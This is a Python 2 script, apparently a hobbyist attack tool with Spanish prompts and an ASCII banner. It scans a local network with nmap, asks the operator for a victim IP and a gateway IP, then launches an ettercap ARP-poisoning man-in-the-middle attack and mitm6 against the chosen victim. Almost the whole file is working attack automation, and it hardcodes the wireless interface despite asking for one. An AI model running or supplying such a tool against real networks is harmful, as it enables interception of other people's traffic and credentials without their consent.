#_*_ coding: utf8 _*_
#[✔]
#sudo ettercap -T -S -i wlp1s0 -M arp:remote /192.168.0.1// /192.168.0.3//
import os,sys,time,socket
W = '\033[37m'
R = '\033[0;31m'  # red
G = '\033[0;32m'  # green
O = '\033[0;33m'  # orange
B = '\033[0;34m'  # blue
P = '\033[0;35m'  # purple
C = '\033[0;36m'  # cyan
GRs = '\033[0;37m'  # gray  
GR = '\033[1;37m'  # gray 
os.system("sudo python tablas.py")
os.system("clear")
print(G)
os.system("iwconfig")
iface = raw_input(C+"Interfaz > "+W)
os.system("clear")
print(R+"[-] EJECUTE EL ARCHIVO COMO USUARIO ROOT")
def banner():
	print(O+"""
	  __________________    
	 /                 /|    
	+-----------------+ |    """+W+"********************"+O+"""
	|.---------------.| |    """+W+"* "+G+"SIMPLES MITM ARP "+W+"*"+O+""" 
	||               || |    """+W+"********************"+O+"""
	||    """+W+""" KALI  """+O+"""    || |     
	||               || |    """+G+"By MRX04"+O+"""
	|'---------------'| |    
	|_________________|/           
		
""")

def attack_ban():
	print(O+"""
		  __________________      <=====>     _______________________
		 /                 /|     <=====>    /                       /|
		+-----------------+ |     <=====>   +-----------------------+ |
		|.---------------.| |     <=====>   |.---------------------.| |
		||               || |     <=====>   ||                     || |
		||     """+W+""" KALI"""+O+"""     || |     <=====>   ||    """+vic+"""      || |
		||               || |     <=====>   ||                     || |
		|'---------------'| |     <=====>   |'---------------------'| |
		|_________________|/      <=====>   |_______________________|/       
		""")
banner()
desea = raw_input(B+"Desea escanear la red [S/n]:")
if desea == "s" or desea == "S":
	print(W)
	os.system("ifconfig "+iface)
	ip = raw_input(C+"IP local > "+W)
	print(G+"[*] "+W+"Escaneando la red local..."+O)
	os.system("script -c 'sudo nmap -sn 192.168.0.1/24' scan-red.log")
	vic = raw_input(C+"IP Victima > "+W)
	gateway = raw_input(C+"IP Gateway > "+W)
	os.system("clear")
	attack_ban()
	print(G+"[SEND] "+W+"Comenzando ataque con ettercap..."+G)
	os.system("sudo ettercap -T -S -i wlp1s0 -M arp:remote /"+gateway+"// /"+vic+"// & xterm -geometry 108x28 -e 'mitm6 -b "+vic+"'")
	enter=raw_input(B+"ENTER PARA TERMINAR PROGRAMA")
if desea == "n" or desea == "N":
	print(W)
	os.system("ifconfig "+iface)
	ip = raw_input(C+"IP local > "+W)
	vic = raw_input(C+"IP Victima > "+W)
	gateway = raw_input(C+"IP Gateway > "+W)
	os.system("clear")
	attack_ban()
	print(G+"[SEND] "+W+"Comenzando ataque con ettercap..."+G)
	os.system("sudo ettercap -T -S -i wlp1s0 -M arp:remote /"+gateway+"// /"+vic+"// & xterm -geometry 108x28 -e 'mitm6 -b "+vic+"'")
	enter=raw_input(B+"ENTER PARA TERMINAR PROGRAMA")

